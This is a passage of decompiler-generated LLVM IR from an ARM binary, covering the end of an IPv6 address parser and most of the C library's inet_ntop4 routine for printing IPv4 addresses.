  %v2_1cd80 = bitcast i32* %stack_var_-56 to i8*
  %v3_1cd80 = call i32 @__GI_memset(i8* %v2_1cd80, i32 0)
  %v0_1cd84 = load i32, i32* @r5, align 4
  %v1_1cd84 = inttoptr i32 %v0_1cd84 to i8*
  %v2_1cd84 = load i8, i8* %v1_1cd84, align 1
  %v3_1cd84 = zext i8 %v2_1cd84 to i32
  store i32 %v3_1cd84, i32* %r3.global-to-local, align 4
  %v7_1cd88 = icmp eq i8 %v2_1cd84, 58
  store i32 %v3_1cd80, i32* @r6, align 4
  %v2_1cd90 = add i32 %v3_1cd80, 16
  store i32 %v2_1cd90, i32* %r8.global-to-local, align 4
  br i1 %v7_1cd88, label %dec_label_pc_1cd98, label %dec_label_pc_1cda4

dec_label_pc_1cd98:                               ; preds = %dec_label_pc_1cd74
  %v1_1cd98 = add i32 %v0_1cd84, 1
  %v2_1cd98 = inttoptr i32 %v1_1cd98 to i8*
  %v3_1cd98 = load i8, i8* %v2_1cd98, align 1
  %v4_1cd98 = zext i8 %v3_1cd98 to i32
  store i32 %v4_1cd98, i32* %r3.global-to-local, align 4
  store i32 %v1_1cd98, i32* @r5, align 4
  %v7_1cd9c = icmp eq i8 %v3_1cd98, 58
  br i1 %v7_1cd9c, label %dec_label_pc_1cda4, label %dec_label_pc_1cf24

dec_label_pc_1cda4:                               ; preds = %dec_label_pc_1cd98, %dec_label_pc_1cd74
  %v0_1cdb0 = phi i32 [ %v1_1cd98, %dec_label_pc_1cd98 ], [ %v0_1cd84, %dec_label_pc_1cd74 ]
  store i32 -33376, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_1cdac = load i32, i32* @r4, align 4
  %v2_1cdac = add i32 %v0_1cdac, -33376
  store i32 %v0_1cdb0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_1cdac, i32* %stack_var_-64, align 4
  %v1_1ce883 = inttoptr i32 %v0_1cdb0 to i8*
  %v2_1ce884 = load i8, i8* %v1_1ce883, align 1
  %v3_1ce885 = zext i8 %v2_1ce884 to i32
  store i32 %v3_1ce885, i32* @r4, align 4
  %v2_1ce8c6 = icmp eq i8 %v2_1ce884, 0
  br i1 %v2_1ce8c6, label %dec_label_pc_1ce94.thread, label %dec_label_pc_1cdc4

dec_label_pc_1ce94.thread:                        ; preds = %dec_label_pc_1cda4
  store i32 %v3_1cd80, i32* @r4, align 4
  br label %dec_label_pc_1cec0

dec_label_pc_1cdc4:                               ; preds = %dec_label_pc_1cda4, %dec_label_pc_1ce88.backedge.dec_label_pc_1cdc4_crit_edge
  %v0_1cdc8 = phi i32 [ %v3_1ce88, %dec_label_pc_1ce88.backedge.dec_label_pc_1cdc4_crit_edge ], [ %v3_1ce885, %dec_label_pc_1cda4 ]
  %v2_1cdc4 = phi i32 [ %v2_1cdc4.pre, %dec_label_pc_1ce88.backedge.dec_label_pc_1cdc4_crit_edge ], [ %v2_1cdac, %dec_label_pc_1cda4 ]
  store i32 %v2_1cdc4, i32* @r0, align 4
  %v1_1cdc8 = or i32 %v0_1cdc8, 32
  store i32 %v1_1cdc8, i32* %r1.global-to-local, align 4
  %v2_1cdcc = call i32 @__GI_strchr(i32 %v2_1cdc4, i32 %v1_1cdc8)
  %v2_1cdd0 = icmp eq i32 %v2_1cdcc, 0
  %v0_1cdd4 = load i32, i32* @r5, align 4
  %v1_1cdd4 = add i32 %v0_1cdd4, 1
  store i32 %v1_1cdd4, i32* @r5, align 4
  br i1 %v2_1cdd0, label %dec_label_pc_1cdf8, label %dec_label_pc_1cddc

dec_label_pc_1cddc:                               ; preds = %dec_label_pc_1cdc4
  %v2_1cddc = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1cddc, i32* %r2.global-to-local, align 4
  %v2_1cde0 = sub i32 %v2_1cdcc, %v2_1cddc
  %v1_1cde4 = load i32, i32* @r7, align 4
  %v4_1cde4 = mul i32 %v1_1cde4, 16
  %v5_1cde4 = or i32 %v4_1cde4, %v2_1cde0
  store i32 %v5_1cde4, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_1cde4, 65536
  br i1 %tmp36, label %dec_label_pc_1ce84, label %dec_label_pc_1cf24

dec_label_pc_1cdf8:                               ; preds = %dec_label_pc_1cdc4
  %v0_1cdf8 = load i32, i32* @r4, align 4
  %v7_1cdf8 = icmp eq i32 %v0_1cdf8, 58
  br i1 %v7_1cdf8, label %dec_label_pc_1ce00, label %dec_label_pc_1ce58

dec_label_pc_1ce00:                               ; preds = %dec_label_pc_1cdf8
  %v0_1ce00 = load i32, i32* %sb.global-to-local, align 4
  %v2_1ce00 = icmp eq i32 %v0_1ce00, 0
  br i1 %v2_1ce00, label %dec_label_pc_1ce08, label %dec_label_pc_1ce1c

dec_label_pc_1ce08:                               ; preds = %dec_label_pc_1ce00
  %v0_1ce08 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ce08 = icmp eq i32 %v0_1ce08, 0
  br i1 %v2_1ce08, label %dec_label_pc_1ce10, label %dec_label_pc_1cf24

dec_label_pc_1ce10:                               ; preds = %dec_label_pc_1ce08
  %v0_1ce10 = load i32, i32* @r6, align 4
  store i32 %v0_1ce10, i32* %fp.global-to-local, align 4
  store i32 %v1_1cdd4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1ce88.backedge

dec_label_pc_1ce1c:                               ; preds = %dec_label_pc_1ce00
  %v1_1ce1c = inttoptr i32 %v1_1cdd4 to i8*
  %v2_1ce1c = load i8, i8* %v1_1ce1c, align 1
  %v3_1ce1c = zext i8 %v2_1ce1c to i32
  store i32 %v3_1ce1c, i32* %r3.global-to-local, align 4
  %v2_1ce20 = icmp eq i8 %v2_1ce1c, 0
  br i1 %v2_1ce20, label %dec_label_pc_1cf24, label %dec_label_pc_1ce28

dec_label_pc_1ce28:                               ; preds = %dec_label_pc_1ce1c
  %v0_1ce28 = load i32, i32* @r6, align 4
  %v1_1ce28 = add i32 %v0_1ce28, 2
  store i32 %v1_1ce28, i32* %r3.global-to-local, align 4
  %v1_1ce2c = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_1ce28, %v1_1ce2c
  br i1 %tmp37, label %dec_label_pc_1cf24, label %dec_label_pc_1ce34

dec_label_pc_1ce34:                               ; preds = %dec_label_pc_1ce28
  %v0_1ce34 = load i32, i32* @r7, align 4
  %v3_1ce34 = udiv i32 %v0_1ce34, 256
  store i32 %v3_1ce34, i32* %r2.global-to-local, align 4
  store i32 %v0_1ce28, i32* %r3.global-to-local, align 4
  %v1_1ce3c = trunc i32 %v3_1ce34 to i8
  %v3_1ce3c = inttoptr i32 %v0_1ce28 to i8*
  store i8 %v1_1ce3c, i8* %v3_1ce3c, align 1
  %v4_1ce3c = load i32, i32* %r3.global-to-local, align 4
  %v5_1ce3c = add i32 %v4_1ce3c, 1
  store i32 %v5_1ce3c, i32* @r3, align 4
  %v0_1ce40 = load i32, i32* @r7, align 4
  %v1_1ce40 = trunc i32 %v0_1ce40 to i8
  %v2_1ce40 = load i32, i32* @r6, align 4
  %v3_1ce40 = add i32 %v2_1ce40, 1
  %v4_1ce40 = inttoptr i32 %v3_1ce40 to i8*
  store i8 %v1_1ce40, i8* %v4_1ce40, align 1
  store i32 0, i32* @r7, align 4
  %v0_1ce48 = load i32, i32* @r3, align 4
  %v1_1ce48 = add i32 %v0_1ce48, 1
  store i32 %v1_1ce48, i32* @r6, align 4
  %v0_1ce4c = load i32, i32* @r5, align 4
  store i32 %v0_1ce4c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1ce88.backedge

dec_label_pc_1ce58:                               ; preds = %dec_label_pc_1cdf8
  %v7_1ce58 = icmp eq i32 %v0_1cdf8, 46
  br i1 %v7_1ce58, label %dec_label_pc_1ce60, label %dec_label_pc_1cf24

dec_label_pc_1ce60:                               ; preds = %dec_label_pc_1ce58
  %v0_1ce60 = load i32, i32* @r6, align 4
  %v1_1ce60 = add i32 %v0_1ce60, 4
  store i32 %v1_1ce60, i32* @r4, align 4
  %v1_1ce64 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1ce60, %v1_1ce64
  br i1 %tmp38, label %dec_label_pc_1cf24, label %dec_label_pc_1ce6c

dec_label_pc_1ce6c:                               ; preds = %dec_label_pc_1ce60
  %v0_1ce6c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1ce6c, i32* @r0, align 4
  store i32 %v0_1ce60, i32* %r1.global-to-local, align 4
  %v3_1ce74 = call i32 @inet_pton4(i32 %v0_1ce6c, i32 %v0_1ce60)
  %v5_1ce7c = icmp sgt i32 %v3_1ce74, 0
  br i1 %v5_1ce7c, label %dec_label_pc_1ce6c.dec_label_pc_1cec0_crit_edge, label %dec_label_pc_1cf24

dec_label_pc_1ce6c.dec_label_pc_1cec0_crit_edge:  ; preds = %dec_label_pc_1ce6c
  %v0_1cf04.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1cec0

dec_label_pc_1ce84:                               ; preds = %dec_label_pc_1cddc
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1ce88.backedge

dec_label_pc_1ce88.backedge:                      ; preds = %dec_label_pc_1ce84, %dec_label_pc_1ce10, %dec_label_pc_1ce34
  %v0_1ce88 = phi i32 [ %v1_1cdd4, %dec_label_pc_1ce84 ], [ %v1_1cdd4, %dec_label_pc_1ce10 ], [ %v0_1ce4c, %dec_label_pc_1ce34 ]
  %v0_1ce9412 = phi i32 [ 1, %dec_label_pc_1ce84 ], [ 0, %dec_label_pc_1ce10 ], [ 0, %dec_label_pc_1ce34 ]
  %v1_1ce88 = inttoptr i32 %v0_1ce88 to i8*
  %v2_1ce88 = load i8, i8* %v1_1ce88, align 1
  %v3_1ce88 = zext i8 %v2_1ce88 to i32
  store i32 %v3_1ce88, i32* @r4, align 4
  %v2_1ce8c = icmp eq i8 %v2_1ce88, 0
  br i1 %v2_1ce8c, label %dec_label_pc_1ce94, label %dec_label_pc_1ce88.backedge.dec_label_pc_1cdc4_crit_edge

dec_label_pc_1ce88.backedge.dec_label_pc_1cdc4_crit_edge: ; preds = %dec_label_pc_1ce88.backedge
  %v2_1cdc4.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1cdc4

dec_label_pc_1ce94:                               ; preds = %dec_label_pc_1ce88.backedge
  %v0_1ce98.pre = load i32, i32* @r6, align 4
  %v2_1ce94 = icmp eq i32 %v0_1ce9412, 0
  store i32 %v0_1ce98.pre, i32* @r4, align 4
  br i1 %v2_1ce94, label %dec_label_pc_1cec0, label %dec_label_pc_1cea0

dec_label_pc_1cea0:                               ; preds = %dec_label_pc_1ce94
  %v1_1cea0 = add i32 %v0_1ce98.pre, 2
  store i32 %v1_1cea0, i32* %r3.global-to-local, align 4
  %v1_1cea4 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1cea0, %v1_1cea4
  br i1 %tmp39, label %dec_label_pc_1cf24, label %dec_label_pc_1ceac

dec_label_pc_1ceac:                               ; preds = %dec_label_pc_1cea0
  store i32 %v0_1ce98.pre, i32* %r3.global-to-local, align 4
  %v0_1ceb0 = load i32, i32* @r7, align 4
  %v3_1ceb0 = udiv i32 %v0_1ceb0, 256
  store i32 %v3_1ceb0, i32* %r2.global-to-local, align 4
  %v1_1ceb4 = trunc i32 %v3_1ceb0 to i8
  %v3_1ceb4 = inttoptr i32 %v0_1ce98.pre to i8*
  store i8 %v1_1ceb4, i8* %v3_1ceb4, align 1
  %v4_1ceb4 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ceb4 = add i32 %v4_1ceb4, 1
  store i32 %v5_1ceb4, i32* @r3, align 4
  %v0_1ceb8 = load i32, i32* @r7, align 4
  %v1_1ceb8 = trunc i32 %v0_1ceb8 to i8
  %v2_1ceb8 = load i32, i32* @r6, align 4
  %v3_1ceb8 = add i32 %v2_1ceb8, 1
  %v4_1ceb8 = inttoptr i32 %v3_1ceb8 to i8*
  store i8 %v1_1ceb8, i8* %v4_1ceb8, align 1
  %v0_1cebc = load i32, i32* @r3, align 4
  %v1_1cebc = add i32 %v0_1cebc, 1
  store i32 %v1_1cebc, i32* @r4, align 4
  br label %dec_label_pc_1cec0

dec_label_pc_1cec0:                               ; preds = %dec_label_pc_1ce6c.dec_label_pc_1cec0_crit_edge, %dec_label_pc_1ce94.thread, %dec_label_pc_1ce94, %dec_label_pc_1ceac
  %v0_1cf04.pre = phi i32 [ %v0_1cf04.pre.pre, %dec_label_pc_1ce6c.dec_label_pc_1cec0_crit_edge ], [ %v3_1cd80, %dec_label_pc_1ce94.thread ], [ %v0_1ce98.pre, %dec_label_pc_1ce94 ], [ %v1_1cebc, %dec_label_pc_1ceac ]
  %v0_1cec0 = load i32, i32* %fp.global-to-local, align 4
  %v2_1cec0 = icmp eq i32 %v0_1cec0, 0
  %v1_1cf04.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1cec0, label %dec_label_pc_1cf04, label %dec_label_pc_1cec8

dec_label_pc_1cec8:                               ; preds = %dec_label_pc_1cec0
  %v9_1cec8 = icmp eq i32 %v0_1cf04.pre, %v1_1cf04.pre
  %v2_1cecc = sub i32 %v0_1cf04.pre, %v0_1cec0
  store i32 %v2_1cecc, i32* @ip, align 4
  br i1 %v9_1cec8, label %dec_label_pc_1cf24, label %dec_label_pc_1ceec.preheader

dec_label_pc_1ceec.preheader:                     ; preds = %dec_label_pc_1cec8
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1ceec

dec_label_pc_1cee0:                               ; preds = %dec_label_pc_1ceec
  %v2_1cef4 = sub i32 %v0_1cf00, %v0_1cef8
  %v0_1cee0 = load i32, i32* %fp.global-to-local, align 4
  %v2_1cee0 = add i32 %v0_1cee0, %v2_1cef0
  %v3_1cee0 = inttoptr i32 %v2_1cee0 to i8*
  %v4_1cee0 = load i8, i8* %v3_1cee0, align 1
  %v6_1cee0 = zext i8 %v4_1cee0 to i32
  store i32 %v6_1cee0, i32* @r3, align 4
  %v3_1cee4 = inttoptr i32 %v2_1cef4 to i8*
  store i8 %v4_1cee0, i8* %v3_1cee4, align 1
  %v0_1cee8 = load i32, i32* @lr, align 4
  %v1_1cee8 = trunc i32 %v0_1cee8 to i8
  %v2_1cee8 = load i32, i32* %fp.global-to-local, align 4
  %v3_1cee8 = load i32, i32* %r1.global-to-local, align 4
  %v4_1cee8 = add i32 %v3_1cee8, %v2_1cee8
  %v5_1cee8 = inttoptr i32 %v4_1cee8 to i8*
  store i8 %v1_1cee8, i8* %v5_1cee8, align 1
  %v0_1ceec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ceec.pre = load i32, i32* @ip, align 4
  %v1_1cef4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1ceec

dec_label_pc_1ceec:                               ; preds = %dec_label_pc_1ceec.preheader, %dec_label_pc_1cee0
  %v0_1cf00 = phi i32 [ %v1_1cf04.pre, %dec_label_pc_1ceec.preheader ], [ %v1_1cef4.pre, %dec_label_pc_1cee0 ]
  %v1_1cef0 = phi i32 [ %v2_1cecc, %dec_label_pc_1ceec.preheader ], [ %v1_1ceec.pre, %dec_label_pc_1cee0 ]
  %v0_1cef8 = phi i32 [ 1, %dec_label_pc_1ceec.preheader ], [ %v0_1ceec.pre, %dec_label_pc_1cee0 ]
  %v2_1ceec = sub i32 %v0_1cef8, %v1_1cef0
  %v4_1ceec = xor i32 %v0_1cef8, %v1_1cef0
  %v5_1ceec = xor i32 %v2_1ceec, %v0_1cef8
  %v6_1ceec = and i32 %v5_1ceec, %v4_1ceec
  %v7_1ceec = icmp slt i32 %v6_1ceec, 0
  %v8_1ceec = icmp slt i32 %v2_1ceec, 0
  %v9_1ceec = icmp eq i32 %v0_1cef8, %v1_1cef0
  %v2_1cef0 = sub i32 %v1_1cef0, %v0_1cef8
  store i32 %v2_1cef0, i32* %r1.global-to-local, align 4
  %v1_1cef8 = add i32 %v0_1cef8, 1
  store i32 %v1_1cef8, i32* %r2.global-to-local, align 4
  %v3_1cefc = xor i1 %v8_1ceec, %v7_1ceec
  %v4_1cefc = or i1 %v9_1ceec, %v3_1cefc
  br i1 %v4_1cefc, label %dec_label_pc_1cee0, label %dec_label_pc_1cf00

dec_label_pc_1cf00:                               ; preds = %dec_label_pc_1ceec
  store i32 %v0_1cf00, i32* @r4, align 4
  br label %dec_label_pc_1cf04

dec_label_pc_1cf04:                               ; preds = %dec_label_pc_1cec0, %dec_label_pc_1cf00
  %v0_1cf04 = phi i32 [ %v0_1cf00, %dec_label_pc_1cf00 ], [ %v0_1cf04.pre, %dec_label_pc_1cec0 ]
  %v1_1cf04 = phi i32 [ %v0_1cf00, %dec_label_pc_1cf00 ], [ %v1_1cf04.pre, %dec_label_pc_1cec0 ]
  %v9_1cf04 = icmp eq i32 %v0_1cf04, %v1_1cf04
  br i1 %v9_1cf04, label %dec_label_pc_1cf0c, label %dec_label_pc_1cf24

dec_label_pc_1cf0c:                               ; preds = %dec_label_pc_1cf04
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_1cd74, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1cf18 = call i32 @memcpy()
  br label %dec_label_pc_1cf3c

dec_label_pc_1cf24:                               ; preds = %dec_label_pc_1cddc, %dec_label_pc_1ce08, %dec_label_pc_1ce28, %dec_label_pc_1ce1c, %dec_label_pc_1cec8, %dec_label_pc_1ce6c, %dec_label_pc_1ce58, %dec_label_pc_1cf04, %dec_label_pc_1cd98, %dec_label_pc_1cea0, %dec_label_pc_1ce60
  br label %dec_label_pc_1cf3c

dec_label_pc_1cf2c:                               ; preds = %dec_label_pc_1cd58
  %v0_1cf2c = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_1cf34 = inttoptr i32 %v0_1cf2c to i32*
  store i32 97, i32* %v2_1cf34, align 4
  br label %dec_label_pc_1cf3c

dec_label_pc_1cf3c:                               ; preds = %dec_label_pc_1cf24, %dec_label_pc_1cf0c, %dec_label_pc_1cd64, %dec_label_pc_1cf2c
  %v1_1cf44 = phi i32 [ 0, %dec_label_pc_1cf24 ], [ 1, %dec_label_pc_1cf0c ], [ %v3_1cd6c, %dec_label_pc_1cd64 ], [ -1, %dec_label_pc_1cf2c ]
  store i32 %v3_1cd38, i32* @r4, align 4
  store i32 %v6_1cd38, i32* @r5, align 4
  store i32 %v9_1cd38, i32* @r6, align 4
  store i32 %v12_1cd38, i32* @r7, align 4
  store i32 %v27_1cd38, i32* @lr, align 4
  ret i32 %v1_1cf44

; uselistorder directives
  uselistorder i32 %v2_1cef0, { 1, 0 }
  uselistorder i32 %v2_1ceec, { 1, 0 }
  uselistorder i32 %v0_1cef8, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_1cef0, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1cf00, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1cf04.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1cf04.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1ceb0, { 1, 0 }
  uselistorder i32 %v0_1ce98.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1ce88, { 1, 0 }
  uselistorder i32 %v0_1ce60, { 1, 0, 2 }
  uselistorder i32 %v3_1ce34, { 1, 0 }
  uselistorder i32 %v0_1ce28, { 1, 0, 2 }
  uselistorder i32 %v1_1cdd4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_1cdc4, { 1, 0 }
  uselistorder i32 %v0_1cdb0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1cf3c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1cf24, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1cf04, { 1, 0 }
  uselistorder label %dec_label_pc_1ceec, { 1, 0 }
  uselistorder label %dec_label_pc_1cec0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1ce88.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1cdc4, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_1d02c = ptrtoint i32* %stack_var_-40 to i32
  %v2_1d00c = add i32 %v2_1d02c, -17
  br label %dec_label_pc_1d02c

dec_label_pc_1cf7c:                               ; preds = %dec_label_pc_1d02c
  %v0_1cf7c = load i32, i32* %fp.global-to-local, align 4
  %v2_1cf7c = add i32 %v0_1cf7c, %v1_1cf7c
  %v3_1cf7c = inttoptr i32 %v2_1cf7c to i8*
  %v4_1cf7c = load i8, i8* %v3_1cf7c, align 1
  %v6_1cf7c = zext i8 %v4_1cf7c to i32
  store i32 %v6_1cf7c, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_1cf7c, 100
  %v2_1cf84 = zext i8 %div4 to i32
  store i32 %v2_1cf84, i32* %r0.global-to-local, align 4
  %v1_1cf88 = or i8 %div4, 48
  %v3_1cf8c = add i32 %v2_1d03c, -17
  %v4_1cf8c = inttoptr i32 %v3_1cf8c to i8*
  store i8 %v1_1cf88, i8* %v4_1cf8c, align 1
  %v0_1cf90 = load i32, i32* %r5.global-to-local, align 4
  %v1_1cf90 = add i32 %v0_1cf90, -17
  %v2_1cf90 = inttoptr i32 %v1_1cf90 to i8*
  %v3_1cf90 = load i8, i8* %v2_1cf90, align 1
  %v0_1cf94 = load i32, i32* %r6.global-to-local, align 4
  %v1_1cf94 = add i32 %v0_1cf94, 1
  store i32 %v1_1cf94, i32* %r6.global-to-local, align 4
  store i32 %v2_1d02c, i32* %r2.global-to-local, align 4
  %v7_1cf9c = icmp eq i8 %v3_1cf90, 48
  %v0_1cfa4 = load i32, i32* %r4.global-to-local, align 4
  %v0_1cfac = load i32, i32* %fp.global-to-local, align 4
  %v1_1cfac = load i32, i32* %sl.global-to-local, align 4
  %v2_1cfac = add i32 %v1_1cfac, %v0_1cfac
  store i32 %v2_1cfac, i32* %sb.global-to-local, align 4
  %v2_1cfb4 = udiv i32 %v0_1cfa4, 10
  %v1_1cfbc = urem i32 %v2_1cfb4, 256
  %v2_1cfc0 = udiv i32 %v1_1cfbc, 10
  %v3_1cfc0 = urem i32 %v1_1cfbc, 10
  store i32 %v2_1cfc0, i32* %r0.global-to-local, align 4
  %v1_1cfc4 = or i32 %v3_1cfc0, 48
  br i1 %v7_1cf9c, label %dec_label_pc_1cfb4, label %dec_label_pc_1cfdc

dec_label_pc_1cfb4:                               ; preds = %dec_label_pc_1cf7c
  %v7_1cfcc = icmp eq i32 %v1_1cfc4, 48
  br i1 %v7_1cfcc, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1cfb4
  store i32 %v1_1cf94, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1cfb4, %bb
  %v1_1cfd4 = trunc i32 %v1_1cfc4 to i8
  store i8 %v1_1cfd4, i8* %v2_1cf90, align 1
  %v0_1d008.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cff8

dec_label_pc_1cfdc:                               ; preds = %dec_label_pc_1cf7c
  %v2_1cfa8 = add i32 %v1_1cf94, %v2_1d02c
  %v1_1cff0 = trunc i32 %v1_1cfc4 to i8
  %v3_1cff0 = add i32 %v2_1cfa8, -17
  %v4_1cff0 = inttoptr i32 %v3_1cff0 to i8*
  store i8 %v1_1cff0, i8* %v4_1cff0, align 1
  %v0_1cff4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1cff4 = add i32 %v0_1cff4, 1
  store i32 %v1_1cff4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cff8

dec_label_pc_1cff8:                               ; preds = %bb18, %dec_label_pc_1cfdc
  %v0_1d008 = phi i32 [ %v0_1d008.pre, %bb18 ], [ %v1_1cff4, %dec_label_pc_1cfdc ]
  %v0_1cff8 = load i32, i32* %sb.global-to-local, align 4
  %v1_1cff8 = inttoptr i32 %v0_1cff8 to i8*
  %v2_1cff8 = load i8, i8* %v1_1cff8, align 1
  %tmp19 = urem i8 %v2_1cff8, 10
  store i32 %v2_1d02c, i32* %ip.global-to-local, align 4
  %v1_1d008 = add i32 %v0_1d008, 1
  store i32 %v1_1d008, i32* %r0.global-to-local, align 4
  %v1_1d010 = or i8 %tmp19, 48
  %v3_1d014 = add i32 %v2_1d00c, %v0_1d008
  %v4_1d014 = inttoptr i32 %v3_1d014 to i8*
  store i8 %v1_1d010, i8* %v4_1d014, align 1
  %v0_1d018 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d018 = load i32, i32* %r0.global-to-local, align 4
  %v2_1d018 = add i32 %v1_1d018, %v0_1d018
  store i32 %v2_1d018, i32* %r2.global-to-local, align 4
  %v3_1d020 = add i32 %v2_1d018, -17
  %v4_1d020 = inttoptr i32 %v3_1d020 to i8*
  store i8 46, i8* %v4_1d020, align 1
  %v0_1d024 = load i32, i32* %r0.global-to-local, align 4
  %v1_1d024 = add i32 %v0_1d024, 1
  store i32 %v1_1d024, i32* %r6.global-to-local, align 4
  %v0_1d028 = load i32, i32* %sl.global-to-local, align 4
  %v1_1d028 = add i32 %v0_1d028, 1
  store i32 %v1_1d028, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1d02c

dec_label_pc_1d02c:                               ; preds = %entry, %dec_label_pc_1cff8
  %v0_1d038 = phi i32 [ 0, %entry ], [ %v1_1d024, %dec_label_pc_1cff8 ]
  %v1_1cf7c = phi i32 [ 0, %entry ], [ %v1_1d028, %dec_label_pc_1cff8 ]
  store i32 %v2_1d02c, i32* %ip.global-to-local, align 4
  store i32 %v0_1d038, i32* %r7.global-to-local, align 4
  %v2_1d03c = add i32 %v0_1d038, %v2_1d02c
  store i32 %v2_1d03c, i32* %r5.global-to-local, align 4
  %v7_1d040 = icmp sgt i32 %v1_1cf7c, 3
  br i1 %v7_1d040, label %dec_label_pc_1d044, label %dec_label_pc_1cf7c

dec_label_pc_1d044:                               ; preds = %dec_label_pc_1d02c
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1d048 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_1d048, i32* %r4.global-to-local, align 4
  %v3_1d04c = add i32 %v2_1d03c, -18
  %v4_1d04c = inttoptr i32 %v3_1d04c to i8*
  store i8 0, i8* %v4_1d04c, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_1d048, i32* %r0.global-to-local, align 4
  %v3_1d054 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_1d054, i32* %r0.global-to-local, align 4
  %v2_1d058 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1d058, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_1d054, %v2_1d058
  br i1 %tmp, label %dec_label_pc_1d064, label %dec_label_pc_1d078

dec_label_pc_1d064:                               ; preds = %dec_label_pc_1d044
  %v0_1d064 = call i32 @__GI___errno_location()
  store i32 %v0_1d064, i32* %r0.global-to-local, align 4
  %v0_1d06c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1d06c, i32* %r2.global-to-local, align 4
  %v2_1d070 = inttoptr i32 %v0_1d064 to i32*
  store i32 28, i32* %v2_1d070, align 4
  %v0_1d088.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d088

dec_label_pc_1d078:                               ; preds = %dec_label_pc_1d044
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_1d048, i32* @r1, align 4
  %v2_1d080 = inttoptr i32 %arg2 to i8*
  %v3_1d080 = call i32 @strcpy(i8* %v2_1d080, i32 %v2_1d048)
  store i32 %v3_1d080, i32* %r0.global-to-local, align 4
  store i32 %v3_1d080, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d088

dec_label_pc_1d088:                               ; preds = %dec_label_pc_1d064, %dec_label_pc_1d078
